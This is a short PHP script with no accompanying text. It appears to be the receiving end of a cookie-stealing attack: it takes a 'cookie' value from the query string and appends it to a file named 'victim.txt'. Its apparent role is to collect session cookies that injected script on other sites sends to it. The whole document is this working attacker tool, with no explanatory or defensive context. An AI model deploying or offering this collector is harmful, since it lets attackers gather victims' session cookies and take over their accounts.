<?php
if(isset($_GET["cookie"])){
	$file = fopen('victim.txt', 'a');
	fwrite($file, $_GET["cookie"]."\n");
	fclose($file);
}
